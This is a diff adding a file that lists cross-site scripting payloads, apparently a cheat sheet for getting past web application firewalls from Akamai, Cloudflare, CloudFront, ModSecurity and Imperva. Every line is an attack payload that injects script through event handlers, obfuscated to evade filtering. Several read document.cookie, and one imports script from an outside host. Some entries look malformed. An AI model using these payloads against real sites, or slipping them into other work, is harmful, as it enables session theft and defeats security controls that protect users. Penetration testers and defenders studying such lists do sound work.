@@ -1,0 +1,30 @@
+Akamai WAF:
+; k='e'%Atop //
+"><A HRef=\" AutoFocus OnFocus=top//?. >
+
+CloudFlare WAF:
+<svg/onload=window >
+<Svg Only=1 OnLoad=confirm(document.domain)>
+<svg Only=1 OnLoad=alert(document.cookie)>
+<svg ONLY%3d1//On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
+%3CSV6/ONLY=1%20ONLOAD=confirm(document.domain)%3E
+<Img Src=//X55.is OnLoad%=@C=import(Src)>
+<Img Src=OnXSS OnError=prompt(1337)>
+<Img Src=OnXSS OnError=prompt(document.cookie)>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbeFyZSBCexBhc3N1ZCA6KQ=="))>
+<svg ONLY%3d1//On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
+
+Cloudfront Waf:
+'><details/open/ontoggle=confirm('XSS')>
+( )%26%25%22%3E%3Csvg/onload=prompt(1)%3E
+window/aabb['al'%2B'ert'](document./aabb/location);//
+<foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
+
+Mod security:
+<svg onload='new Function["y000"].find(al\u0065rt)'>
+
+Imperva WAF:
+<svg OnPointerEnter="location=javascript:alert%2B81%2B9;"></div">
+<details x=xxxxxxxxxxxxxxxxxxxxxx2 open ontoggle=&#x00000000061;
+alert&#x000000028;origin&#x000029;>
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx2 open ontoggle="prompt(document.cookie);">
